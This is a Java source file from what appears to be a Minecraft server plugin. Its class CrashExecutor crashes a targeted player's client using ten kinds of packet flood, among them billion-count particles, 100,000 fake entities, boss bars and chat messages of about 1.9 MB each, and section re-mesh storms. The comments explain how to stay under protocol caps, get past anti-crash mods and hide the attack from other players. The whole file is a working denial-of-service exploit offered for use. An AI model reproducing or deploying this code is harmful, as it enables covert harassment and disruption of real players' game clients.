package com.ultimateimprovments.punish;

import com.ultimateimprovments.core.Main;
import it.unimi.dsi.fastutil.shorts.Short2ObjectMap;
import it.unimi.dsi.fastutil.shorts.Short2ObjectOpenHashMap;
import net.minecraft.core.BlockPos;
import net.minecraft.core.SectionPos;
import net.minecraft.core.particles.ExplosionParticleInfo;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.network.protocol.game.ClientboundAddEntityPacket;
import net.minecraft.network.protocol.game.ClientboundBossEventPacket;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.network.protocol.game.ClientboundLevelChunkWithLightPacket;
import net.minecraft.network.protocol.game.ClientboundLevelParticlesPacket;
import net.minecraft.network.protocol.game.ClientboundSetActionBarTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetDisplayObjectivePacket;
import net.minecraft.network.protocol.game.ClientboundSetObjectivePacket;
import net.minecraft.network.protocol.game.ClientboundSetPlayerTeamPacket;
import net.minecraft.network.protocol.game.ClientboundSetScorePacket;
import net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket;
import net.minecraft.network.protocol.game.ClientboundSectionBlocksUpdatePacket;
import net.minecraft.network.protocol.game.ClientboundSystemChatPacket;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.util.random.WeightedList;
import net.minecraft.world.BossEvent;
import net.minecraft.world.entity.EntityTypes;
import net.minecraft.world.level.ChunkPos;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.block.state.BlockState;
import net.minecraft.world.level.chunk.LevelChunk;
import net.minecraft.world.level.lighting.LevelLightEngine;
import net.minecraft.world.phys.Vec3;
import net.minecraft.world.scores.DisplaySlot;
import net.minecraft.world.scores.Objective;
import net.minecraft.world.scores.PlayerTeam;
import net.minecraft.world.scores.Scoreboard;
import net.minecraft.world.scores.criteria.ObjectiveCriteria;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.UUID;

/**
 * 💥 CrashExecutor — executes a crash of the target player's client.
 * <p>
 * All methods send packets DIRECTLY to the {@code target}'s connection
 * (via {@code ServerPlayer#connection}), so the effect is visible ONLY to
 * the target's client — other players notice nothing.
 * <p>
 * Heavy floods run in async tasks ({@code runTaskAsynchronously}):
 * {@code Connection#send} schedules the actual write onto the target's netty
 * event loop from any thread, so the main thread never stalls and the other
 * players' ping is unaffected.
 *
 * <ul>
 *   <li><b>{@link #crashWithParticles(Player)}</b> — a huge particle counter
 *       (campfire signal smoke). A single {@code ClientboundLevelParticlesPacket}
 *       with count = 999_999_999: the client tries to create a billion particles → OOM.</li>
 *   <li><b>{@link #crashWithEntities(Player)}</b> — thousands of virtual entities
 *       ({@code ClientboundAddEntityPacket} with fake negative entity-ids)
 *       that only exist on the target's client.</li>
 *   <li><b>{@link #crashWithBossBar(Player)}</b> — hundreds of boss bars with a
 *       ~1.9 MB name each. Boss bars are rendered ALWAYS, never auto-removed and
 *       are not capped in number → the client stores hundreds of MB of components → OOM.</li>
 *   <li><b>{@link #crashWithChat(Player)}</b> — huge system chat messages. Chat is
 *       rendered immediately on receipt and the history keeps them → memory + render → OOM.</li>
 *   <li><b>{@link #crashWithScoreboard(Player)}</b> — a sidebar objective with a
 *       ~1.9 MB title plus dozens of scores with 30k-char owners. The sidebar renders always.</li>
 *   <li><b>{@link #crashWithTeam(Player)}</b> — scoreboard teams with huge display
 *       names/prefixes; the client stores and renders them over nametags.</li>
 *   <li><b>{@link #crashWithBlockUpdate(Player)}</b> — section-blocks-update flood that
 *       changes every block of the target's chunk section 2000 times → the client applies
 *       millions of block changes and re-meshes the section constantly (block updates are
 *       essential gameplay traffic — anti-crash mods cannot filter them).</li>
 *   <li><b>{@link #crashWithChunk(Player)}</b> — floods the client with chunk packets
 *       (re-encoding one real chunk for every coordinate around the player) → the client
 *       re-parses and rebuilds chunks non-stop → hard freeze + memory pressure.</li>
 *   <li><b>{@link #crashWithExplosion(Player)}</b> — explosions with an enormous block
 *       count → the client tries to spawn billions of block particles → freeze/OOM.</li>
 *   <li><b>{@link #crashWithTitle(Player)}</b> — huge title/action-bar texts, rendered
 *       instantly on the screen.</li>
 * </ul>
 */
public final class CrashExecutor {

    private CrashExecutor() {}

    // =========================
    // LOAD CONFIGURATION
    // =========================

    /** How many particles in one particle-packet (as before: 999_999_999). */
    private static final int PARTICLE_COUNT = 999_999_999;
    /** How many particle-packet copies we send. */
    private static final int PARTICLE_BURST = 3;

    /** How many virtual entities we create on the target's client (100k — guaranteed crash). */
    private static final int ENTITY_COUNT = 100_000;
    /** Entity scatter radius around the target (blocks). */
    private static final double ENTITY_SPREAD = 1.0;

    /** How many boss bars with a huge name we send (rendered always, never removed). */
    private static final int BOSS_BAR_COUNT = 200;
    /** How many huge system chat messages we send (chat renders immediately). */
    private static final int CHAT_MESSAGE_COUNT = 60;
    /** How many unique huge-title objectives we create (unique names — the client dedupes by name). */
    private static final int SCORE_OBJECTIVE_COUNT = 60;
    /** How many huge scoreboard teams we create. */
    private static final int TEAM_COUNT = 25;
    /** How many section-blocks-update packets we send (each = 4096 block changes → re-mesh). */
    private static final int BLOCK_UPDATE_PACKET_COUNT = 2000;
    /** Total chunk packets sent to the target's client. */
    private static final int CHUNK_PACKET_COUNT = 4000;
    /** Radius (in chunks) around the player whose real chunk packets we flood (5×5 = 25 chunks). */
    private static final int CHUNK_RADIUS = 2;
    /** How many explosion packets with a huge block count we send. */
    private static final int EXPLOSION_COUNT = 12;
    /** Explosion block count — the client spawns this many block particles per explosion. */
    private static final int EXPLOSION_BLOCK_COUNT = 2_000_000_000;
    /** How many huge title/action-bar texts we send. */
    private static final int TITLE_COUNT = 30;

    /**
     * One big text component, built once. A single literal CANNOT exceed the NBT string
     * cap (DataOutput.writeUTF — 65535 bytes), so the text is chained from many small
     * literals: ~1.8M chars total, each segment well under the cap, whole packet under
     * the ~2 MB frame limit.
     */
    private static final Component BIG_TEXT = buildBigText();
    /** Each segment of the big text (chars) — must stay under the 65535-byte NBT string cap. */
    private static final int BIG_TEXT_SEGMENT_CHARS = 30_000;
    /** How many segments are chained into one component. */
    private static final int BIG_TEXT_SEGMENTS = 60;

    private static final Random RANDOM = new Random();

    /** Builds the big chained text component (see {@link #BIG_TEXT}). */
    private static Component buildBigText() {
        MutableComponent text = Component.literal("A".repeat(BIG_TEXT_SEGMENT_CHARS));
        for (int i = 1; i < BIG_TEXT_SEGMENTS; i++) {
            text = text.append(Component.literal("A".repeat(BIG_TEXT_SEGMENT_CHARS)));
        }
        return text;
    }

    // =========================
    // PARTICLE
    // =========================

    /**
     * Particle crash — the same method as before: campfire signal smoke
     * with count = 999_999_999. The target's client tries to create a billion particles → OOM.
     * Only 3 tiny packets — runs on the main thread, no async needed.
     */
    public static void crashWithParticles(Player target) {
        Location loc = target.getLocation();
        double x = loc.getX();
        double y = loc.getY() + 1.0;
        double z = loc.getZ();

        for (int i = 0; i < PARTICLE_BURST; i++) {
            if (!target.isOnline()) return;
            ClientboundLevelParticlesPacket packet = new ClientboundLevelParticlesPacket(
                    ParticleTypes.CAMPFIRE_SIGNAL_SMOKE,
                    true,              // override limiter — particles always render
                    true,              // always show
                    x, y, z,
                    0f, 0f, 0f,        // spread
                    0f,                // speed
                    PARTICLE_COUNT
            );
            send(target, packet);
        }
    }

    // =========================
    // ENTITY — virtual entities
    // =========================

    /**
     * Crash with virtual entities: {@code ENTITY_COUNT} packets of
     * {@code ClientboundAddEntityPacket} with fake negative entity-ids.
     * The target's client creates thousands of entities that don't exist on the server —
     * they're visible only to it and persist until relog. Runs async.
     */
    public static void crashWithEntities(Player target) {
        // Capture the position on the main thread; the flood itself runs OFF the main
        // thread (netty writes are thread-safe), so 100k packets never stall the server
        // tick and other players keep a normal ping.
        Location loc = target.getLocation();

        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            for (int i = 0; i < ENTITY_COUNT; i++) {
                if (!target.isOnline()) return;
                double dx = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;
                double dy = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;
                double dz = (RANDOM.nextDouble() - 0.5) * 2.0 * ENTITY_SPREAD;

                ClientboundAddEntityPacket packet = new ClientboundAddEntityPacket(
                        Integer.MIN_VALUE + i,             // fake id — doesn't collide with real ones
                        new UUID(0x5EED_0000_0000L + i, 0xC0FF_0000_0000L), // deterministic fake uuid
                        loc.getX() + dx,
                        loc.getY() + dy,
                        loc.getZ() + dz,
                        RANDOM.nextFloat() * 360f,         // yRot
                        RANDOM.nextFloat() * 360f,         // xRot
                        EntityTypes.ZOMBIE,
                        0,                                 // data
                        Vec3.ZERO,                         // velocity
                        0d                                 // yHeadRot
                );
                send(target, packet);
            }
        });
    }

    // =========================
    // BOSS BAR — always-rendered OOM
    // =========================

    /**
     * Boss bar flood: {@link #BOSS_BAR_COUNT} boss bars, each with a ~1.9 MB name.
     * Boss bars are rendered ALWAYS (top of the screen), never auto-removed and are
     * not capped in number → the client stores every bar → hundreds of MB of retained
     * components + constant rendering → OOM. Runs async.
     */
    public static void crashWithBossBar(Player target) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            // One shared component — the encoder re-serializes it per packet, so the client
            // still receives the full text every time; the server allocates it only once.
            Component huge = bigText();
            for (int i = 0; i < BOSS_BAR_COUNT; i++) {
                if (!target.isOnline()) return;
                BossEvent event = new BossEvent(
                        UUID.randomUUID(),
                        huge,
                        BossEvent.BossBarColor.RED,
                        BossEvent.BossBarOverlay.PROGRESS
                ) {};
                send(target, ClientboundBossEventPacket.createAddPacket(event));
            }
        });
    }

    // =========================
    // CHAT — immediate-render OOM
    // =========================

    /**
     * Chat flood: {@link #CHAT_MESSAGE_COUNT} system chat messages with a ~1.9 MB text
     * each. Chat is rendered IMMEDIATELY on receipt (unlike the tab list) and the history
     * keeps ~100 messages → the client retains and renders ~100+ MB of text → OOM. Runs async.
     */
    public static void crashWithChat(Player target) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            Component huge = bigText();
            for (int i = 0; i < CHAT_MESSAGE_COUNT; i++) {
                if (!target.isOnline()) return;
                send(target, new ClientboundSystemChatPacket(huge, false));
            }
        });
    }

    // =========================
    // SCOREBOARD — many unique objectives
    // =========================

    /**
     * Scoreboard flood: {@link #SCORE_OBJECTIVE_COUNT} objectives with UNIQUE names, each with
     * a ~1.9 MB title. The client stores every objective in its scoreboard map (deduping by name,
     * so unique names are required — re-sending one objective would just update it) and renders
     * the displayed one in the sidebar ALWAYS. Runs async.
     */
    public static void crashWithScoreboard(Player target) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            Component huge = bigText();
            for (int i = 0; i < SCORE_OBJECTIVE_COUNT; i++) {
                if (!target.isOnline()) return;
                Scoreboard scoreboard = new Scoreboard();
                Objective objective = new Objective(
                        scoreboard,
                        "uo" + i,                        // unique name (≤16 chars) — client dedupes by name
                        ObjectiveCriteria.DUMMY,
                        huge,                            // huge title — always rendered when displayed
                        ObjectiveCriteria.RenderType.INTEGER,
                        false,
                        null
                );
                send(target, new ClientboundSetObjectivePacket(objective, ClientboundSetObjectivePacket.METHOD_ADD));
                send(target, new ClientboundSetDisplayObjectivePacket(DisplaySlot.SIDEBAR, objective));
            }
        });
    }

    // =========================
    // TEAM — nametag flood
    // =========================

    /**
     * Team flood: {@link #TEAM_COUNT} scoreboard teams, each with a ~1.9 MB display name
     * and prefix, with the target added to them. The client stores all the team data and
     * renders the huge prefix over nametags. Runs async.
     */
    public static void crashWithTeam(Player target) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            String targetName = target.getName();
            // Only ONE huge component per packet: the Parameters record serializes both the
            // display name and the prefix, and two 1.9M-char components would exceed the
            // 2 MB protocol cap → the packet would be rejected and the player just kicked.
            // The display name stays the (short) team name; the prefix carries the payload.
            Component hugePrefix = bigText();
            for (int i = 0; i < TEAM_COUNT; i++) {
                if (!target.isOnline()) return;
                PlayerTeam team = new PlayerTeam(new Scoreboard(), "ui_crash_team_" + i);
                team.setPlayerPrefix(hugePrefix);
                send(target, ClientboundSetPlayerTeamPacket.createAddOrModifyPacket(team, true));
                send(target, ClientboundSetPlayerTeamPacket.createMultiplePlayerPacket(
                        team, List.of(targetName), ClientboundSetPlayerTeamPacket.Action.ADD
                ));
            }
        });
    }

    // =========================
    // BLOCK UPDATE — re-mesh storm (unpatched by anti-crash mods)
    // =========================

    /**
     * Block-update flood: {@link #BLOCK_UPDATE_PACKET_COUNT} {@code ClientboundSectionBlocksUpdatePacket}s
     * for the target's own chunk section, each changing ALL 4096 blocks of the section to a
     * different state. The client applies every change (block updates are essential gameplay
     * traffic — anti-crash mods CANNOT drop them) and re-meshes the section after each packet →
     * millions of block sets + a constant re-mesh storm → hard freeze. Runs async.
     */
    public static void crashWithBlockUpdate(Player target) {
        // Section of the player's feet + the one above (both are loaded and rendered).
        org.bukkit.Location loc = target.getLocation();
        BlockPos pos = new BlockPos(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ());
        SectionPos[] sections = {
                SectionPos.of(pos),
                SectionPos.of(pos.offset(0, 16, 0))
        };

        // Four layout VARIANTS per section (palette rotated) — each round-robin re-send
        // applies a genuinely different section, so the client's mesh rebuild is full every time.
        BlockState[] states = {
                Blocks.STONE.defaultBlockState(),
                Blocks.WATER.defaultBlockState(),
                Blocks.SAND.defaultBlockState(),
                Blocks.AIR.defaultBlockState()
        };
        List<ClientboundSectionBlocksUpdatePacket> packets = new ArrayList<>();
        for (SectionPos section : sections) {
            for (int variant = 0; variant < 4; variant++) {
                Short2ObjectMap<BlockState> changes = new Short2ObjectOpenHashMap<>();
                for (int y = 0; y < 16; y++) {
                    for (int z = 0; z < 16; z++) {
                        for (int x = 0; x < 16; x++) {
                            // packed pos: (x & 15) << 8 | (z & 15) << 4 | (y & 15)
                            changes.put((short) (x << 8 | z << 4 | y), states[(x + y + z + variant) & 3]);
                        }
                    }
                }
                packets.add(new ClientboundSectionBlocksUpdatePacket(section, changes));
            }
        }
        int packetCount = packets.size();

        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            for (int i = 0; i < BLOCK_UPDATE_PACKET_COUNT; i++) {
                if (!target.isOnline()) return;
                send(target, packets.get(i % packetCount));
            }
        });
    }

    // =========================
    // CHUNK — re-parse flood
    // =========================

    /**
     * Chunk flood: builds one real chunk packet per chunk around the player (on the main
     * thread — a single encode per chunk is fast) and re-sends them round-robin from an async
     * task. The client re-parses and rebuilds those chunks non-stop → hard freeze + memory
     * pressure.
     * <p>
     * Two gotchas: packets MUST have {@code setReady(true)} — Paper queues non-ready chunk
     * packets in the connection and never flushes them; and each packet must carry its own
     * coordinates (no shared mutable packet — the netty encode would read the last coords).
     */
    public static void crashWithChunk(Player target) {
        try {
            ServerPlayer serverPlayer = ((CraftPlayer) target).getHandle();
            ServerLevel level = serverPlayer.level();
            ChunkPos center = serverPlayer.chunkPosition();
            LevelLightEngine lightEngine = level.getChunkSource().getLightEngine();

            List<ClientboundLevelChunkWithLightPacket> packets = new ArrayList<>();
            for (int dx = -CHUNK_RADIUS; dx <= CHUNK_RADIUS; dx++) {
                for (int dz = -CHUNK_RADIUS; dz <= CHUNK_RADIUS; dz++) {
                    LevelChunk chunk = level.getChunk(center.x() + dx, center.z() + dz);
                    ClientboundLevelChunkWithLightPacket packet =
                            new ClientboundLevelChunkWithLightPacket(chunk, lightEngine, null, null);
                    packet.setReady(true); // Paper: non-ready chunk packets are queued and never flushed
                    packets.add(packet);
                }
            }
            int packetCount = packets.size();

            Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
                for (int i = 0; i < CHUNK_PACKET_COUNT; i++) {
                    if (!target.isOnline()) return;
                    send(target, packets.get(i % packetCount));
                }
            });
        } catch (Exception ignored) {
            // Chunk unavailable — nothing critical.
        }
    }

    // =========================
    // EXPLOSION — block-particle flood
    // =========================

    /**
     * Explosion flood: {@link #EXPLOSION_COUNT} explosions with a block count of
     * {@link #EXPLOSION_BLOCK_COUNT} — the client tries to spawn billions of block
     * particles per explosion → hard freeze/OOM. Runs async.
     */
    public static void crashWithExplosion(Player target) {
        Location loc = target.getLocation();

        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            WeightedList<ExplosionParticleInfo> blockParticles = WeightedList.<ExplosionParticleInfo>builder()
                    .add(new ExplosionParticleInfo(ParticleTypes.EXPLOSION, 1.0f, 0.0f), 1)
                    .build();
            for (int i = 0; i < EXPLOSION_COUNT; i++) {
                if (!target.isOnline()) return;
                ClientboundExplodePacket packet = new ClientboundExplodePacket(
                        new Vec3(loc.getX(), loc.getY(), loc.getZ()),
                        4.0f,
                        EXPLOSION_BLOCK_COUNT,
                        Optional.empty(),
                        ParticleTypes.EXPLOSION,
                        SoundEvents.GENERIC_EXPLODE,
                        blockParticles
                );
                send(target, packet);
            }
        });
    }

    // =========================
    // TITLE / ACTION BAR — instant render
    // =========================

    /**
     * Title flood: {@link #TITLE_COUNT} huge title/action-bar texts. The client renders
     * them INSTANTLY on the main screen — a ~1.9 MB text forces a massive render each frame.
     * Runs async.
     */
    public static void crashWithTitle(Player target) {
        Bukkit.getScheduler().runTaskAsynchronously(Main.getInstance(), () -> {
            Component huge = bigText();
            for (int i = 0; i < TITLE_COUNT; i++) {
                if (!target.isOnline()) return;
                if ((i & 1) == 0) {
                    send(target, new ClientboundSetTitleTextPacket(huge));
                } else {
                    send(target, new ClientboundSetActionBarTextPacket(huge));
                }
            }
        });
    }

    // =========================
    // HELPERS
    // =========================

    /** The shared huge text component (chained small literals — see {@link #BIG_TEXT}). */
    private static Component bigText() {
        return BIG_TEXT;
    }

    /**
     * Sends a packet directly into the target's connection (only their client sees it).
     * Safe: if the player left or the connection is closed — silently skip.
     * Thread-safe: the write is scheduled onto the target's netty event loop from any thread.
     */
    private static void send(Player target, net.minecraft.network.protocol.Packet<?> packet) {
        if (target == null || !target.isOnline()) return;
        try {
            ServerPlayer serverPlayer = ((CraftPlayer) target).getHandle();
            if (serverPlayer.connection == null) return;
            serverPlayer.connection.send(packet);
        } catch (Exception ignored) {
            // The player left / the connection broke mid-flood — not critical.
        }
    }
}
